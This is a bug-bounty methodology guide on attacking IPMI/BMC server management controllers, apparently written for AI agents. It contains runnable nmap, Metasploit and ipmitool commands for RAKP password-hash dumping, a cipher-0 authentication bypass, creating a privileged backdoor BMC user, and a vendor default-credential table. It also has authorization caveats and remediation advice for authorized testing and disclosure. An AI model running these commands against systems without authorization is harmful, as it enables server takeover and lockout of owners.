---
technology: "IPMI / BMC"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: hardware
evidence: "1 evidence file (see ../internal coverage ledger) — thinnest unit in the vault; upstream-weighted by policy"
provenance: "field-mined from 1 engagement in the evidence pool (see ../internal coverage ledger) + upstream: Rapid7 'A Penetration Tester's Guide to IPMI and BMCs' (HD Moore, 2013-07-02; cipher 0, RAKP, default-credential table, ipmitool chains), hashcat.net wiki example_hashes (mode 7300 format), OpenBMC issue tracker (channel getaccess/setaccess output shapes), accessed 2026-11-12. Dan Farmer's original research at fish2.com/ipmi is the primary source behind the Rapid7 guide"
---

Companion page: [[ipmi|IPMI / BMC overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# IPMI / BMC Bug Bounty Methodology

**Scope:** BMC network services — IPMI on UDP (and sometimes TCP) 623, plus the vendor surface (SSH 22, HTTP/S 80/443, VNC 5900, WS-MAN 5985, UPnP 49152). **Out of scope:** Redfish/HTTP management APIs (same box, different unit), host OS itself.

**Authorization:** presumes written permission for the BMC addresses **explicitly** — clients often scope "the server" and forget the BMC. Steps flagged **DESTRUCTIVE** (creating/modifying BMC users, chassis power, SOL) can take down production hardware or lock owners out. Prefer the passive ladder (Phases 1–3) and stop.

## Decision tree (one screen)

1. UDP 623 answers an RMCP ping → Phase 2 (version/cipher recon) → Phase 3 (RAKP hash dump, passive, no state on device) → crack offline → Phase 5 (defaults/reuse).
2. Cipher 0 accepted → Phase 4 (auth bypass; **DESTRUCTIVE** backdoor-user variant only with explicit approval — otherwise prove with `user list` and stop).
3. No 623 but TCP 80/443/22/5900 look like a BMC → Phase 6 (vendor surface + default creds).
4. Cracked/obtained creds → try them on the BMC web UI/SSH **and** on the host's applications (observed pivot) → Phase 5.

## Phase 1 — Discovery

BMCs answer a single-packet UDP probe; they are slow — scan patient, throttle hard.

```bash
nmap -sU -p 623 --open 198.51.100.0/24
nmap -sV -p 22,80,443,5900,5985,49152 198.51.100.10   # vendor surface next to it
```

Observed detection shape: "The scan found an open port 623 (asf-rmcp)" from an `nmap -sU` sweep — UDP-first enumeration is what finds BMCs; TCP-only scans miss the IPMI service.

## Phase 2 — Version and capability recon (passive)

```text
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS 198.51.100.0/24
run
```

Sample output (upstream): `198.51.100.10:623 IPMI-2.0 OEMID:21317 UserAuth(auth_msg, auth_user, non_null_user, null_user) PassAuth(password, md5, md2) Level(1.5, 2.0)` — one packet returns IPMI version, OEM id, auth types, and whether null usernames are allowed. `IPMI-2.0` → RAKP applies (Phase 3). Vendor web banners (`lighttpd` on 80/443, Dropbear on 22) fingerprint Supermicro-class firmware.

## Phase 3 — RAKP password-hash dump (passive, offline crack)

The IPMI 2.0 specification makes the BMC return a salted HMAC-SHA1/MD5 of the named user's password during RAKP, before authentication. No state is written to the device.

```text
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 198.51.100.10
run
```

Output lines are hashcat-ready; mode **7300** is `IPMI2 RAKP HMAC-SHA1`:

```bash
hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
```

Observed chain (verbatim): `use auxiliary/scanner/ipmi/ipmi_dumphashes` → "The hash for user Administrator is retrieved" → `hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt` → cracked → "It is now possible to list/create IPMI users but that's not helpful. We can try to re-use these credentials" on the host application (Zabbix) — which owned the box. **The credential-reuse pivot is the point; BMC admin itself is often a dead end.**

Tip: username candidates leak from the same protocol (the BMC answers differently for valid/invalid users), and vendor defaults (Phase 5) are valid usernames by definition (`Administrator`, `root`, `ADMIN`, `USERID`).

## Phase 4 — Cipher 0 authentication bypass

Cipher suite 0 (no auth) was accepted by HP, Dell, and Supermicro BMCs. Detection:

```text
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS 198.51.100.0/24
run        # "VULNERABLE: Accepted a session open request for cipher zero"
```

Proof without side effects — any password works with any valid username:

```bash
ipmitool -I lanplus -C 0 -H 198.51.100.10 -U Administrator -P ANYTHING_PASSWORD user list
```

**DESTRUCTIVE — backdoor user (only with explicit approval; remove afterwards):**

```bash
ipmitool -I lanplus -C 0 -H 198.51.100.10 -U Administrator -P ANYTHING_PASSWORD user set name 2 backdoor
ipmitool -I lanplus -C 0 -H 198.51.100.10 -U Administrator -P ANYTHING_PASSWORD user set password 2 'password'
ipmitool -I lanplus -C 0 -H 198.51.100.10 -U Administrator -P ANYTHING_PASSWORD user priv 2 4
ipmitool -I lanplus -C 0 -H 198.51.100.10 -U Administrator -P ANYTHING_PASSWORD user enable 2
# cleanup: user disable 2 && user set name 2 '' (empty slot)
```

Upstream demo continued straight to `ssh backdoor@TARGET` landing in the iLO CLI — the BMC's SSH shares the account table.

## Phase 5 — Default credentials and reuse

Verified vendor matrix (Rapid7, 2013 — still the first try list; HP is the only one that randomizes):

| Product | Default user | Default password |
|---|---|---|
| HP iLO | Administrator | factory-randomized 8 chars |
| Dell iDRAC / DRAC | root | calvin |
| IBM IMM | USERID | PASSW0RD (zero) |
| Fujitsu iRMC | admin | admin |
| Supermicro IPMI 2.0 | ADMIN | ADMIN |
| Oracle/Sun ILOM | root | changeme |
| ASUS iKVM BMC | admin | admin |

Then reuse: cracked/default BMC creds → host app logins, SSH, and vice versa (observed: BMC password = Zabbix admin password; an `ipmi-svc` service account on the host carried the same password).

## Phase 6 — Vendor surface (post-auth or default-cred)

```bash
ipmitool -I lanplus -H 198.51.100.10 -U ADMIN -P ADMIN user list          # account table
ipmitool -I lanplus -H 198.51.100.10 -U ADMIN -P ADMIN channel getaccess 1 1   # per-user: priv, link auth, IPMI msg, enable status
ipmitool -I lanplus -H 198.51.100.10 -U ADMIN -P ADMIN channel setaccess 1 2 link=on ipmi=on privilege=4   # DESTRUCTIVE
ipmitool -I lanplus -H 198.51.100.10 -U ADMIN -P ADMIN delloem lanpod   # Dell iDRAC extension
```

`channel getaccess` output fields (upstream shapes): `Maximum User IDs / Enabled User IDs / User ID / User Name / Access Available / Link Authentication / IPMI Messaging / Privilege Level / Enable Status`. Privilege 4 = ADMINISTRATOR.

Host-control primitives (all **DESTRUCTIVE**, list in report but do not run without sign-off): `chassis power status|on|off|cycle`, `sol activate` (serial console — often logged-in root), virtual media mount via the web UI.

Web/SSH/VNC on the BMC: try the same account table — lighttpd admin pages (Supermicro), iLO/iDRAC CLI over SSH, unauthenticated VNC on old Supermicro firmware.

## Disclosure notes

- RAKP and cipher 0 are **specification** flaws — there is no patch; the finding is "BMC reachable from <network X> / flat segment", with the hash dump or `user list` as proof of impact, and the remediation is isolation (dedicated management VLAN, firewall, disable cipher 0 where the vendor allows, rotate defaults).
- Report the credential-reuse impact explicitly when a BMC password opens an application (observed pattern) — that's the step from embedded-device finding to host compromise.
- Never power-cycle, reboot, or mount media on production hardware during testing; `chassis power status` (read-only) is the safe demonstration.

## Appendix A — Tool mapping (prose)

- **ipmitool** — the reference client; `-I lanplus` (IPMI 2.0), `-C 0` (cipher suite 0), `user list/set name/set password/priv/enable`, `channel getaccess/setaccess`, `chassis power`, `sol`, `delloem`.
- **Metasploit** — `auxiliary/scanner/ipmi/ipmi_version`, `ipmi_cipher_zero`, `ipmi_dumphashes` (formats output for hashcat).
- **hashcat** — mode 7300 (IPMI2 RAKP HMAC-SHA1) offline cracking; rockyou-class lists suffice for human-chosen BMC passwords.
- **nmap** — `-sU -p 623` discovery plus `-sV` across the vendor TCP surface (22/80/443/5900/5985).
- **hydra / crowbar** — SSH/web login attempts against the BMC's shared account table (throttle; BMCs are slow).
